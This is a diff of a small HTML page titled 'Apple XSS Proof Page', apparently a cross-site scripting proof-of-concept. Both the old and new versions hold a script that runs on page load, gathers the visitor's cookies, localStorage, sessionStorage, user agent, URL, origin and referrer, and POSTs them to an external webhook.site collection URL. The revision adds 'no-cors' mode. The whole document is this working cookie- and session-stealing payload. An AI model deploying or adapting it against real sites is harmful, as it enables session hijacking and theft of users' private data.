@@ -1,25 +1,31 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>XSS PoC</title>
+  <title>Apple XSS Proof Page</title>
 </head>
 <body>
-  <h1>🔒 Proof of XSS & CSD Exploit</h1>
+  <h1 style="text-align:center;margin-top:20%">XSS Proof Page</h1>
+  
   <script>
-    // Send victim data to Webhook
-    fetch("https://webhook.site/6e22d112-4274-4426-a223-2ba3b29b2868", {
+    // إرسال البيانات إلى Webhook
+    const webhookUrl = "https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b";
+    
+    const payload = {
+      cookie: document.cookie,
+      localStorage: localStorage,
+      sessionStorage: sessionStorage,
+      userAgent: navigator.userAgent,
+      url: location.href,
+      origin: location.origin,
+      referrer: document.referrer
+    };
+
+    fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        cookie: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        userAgent: navigator.userAgent,
-        origin: location.origin,
-        path: location.pathname,
-        fullURL: location.href
-      })
+      body: JSON.stringify(payload),
+      mode: "no-cors"
     });
   </script>
 </body>
